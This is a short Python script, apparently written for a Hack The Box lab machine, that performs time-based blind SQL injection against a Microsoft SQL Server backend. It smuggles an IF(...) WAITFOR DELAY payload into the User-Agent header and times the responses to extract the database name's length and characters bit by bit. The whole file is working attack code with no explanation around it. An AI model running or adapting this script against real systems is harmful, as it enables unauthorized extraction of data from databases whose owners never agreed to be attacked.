import requests, time

DELAY = 5

def oracle(q):
    start = time.time()
    response = requests.get("http://10.129.3.77:8080/", headers = {"User-Agent": f"htb'; IF({q}) WAITFOR DELAY '0:0:{DELAY}'--"})
    return time.time() - start >= DELAY

# Dump a number
def dumpNumber(q):
    length = 0
    for p in range(7):
        if oracle(f"({q})&{2**p}>0"):
            length |= 2**p
    return length

db_name_length = dumpNumber("LEN(DB_NAME())")
print(db_name_length)

# Dump a string
def dumpString(q, length):
    val = ""
    for i in range(1, length + 1):
        c = 0
        for p in range(7):
            if oracle(f"ASCII(SUBSTRING(({q}),{i},1))&{2**p}>0"):
                c |= 2**p
        val += chr(c)
    return val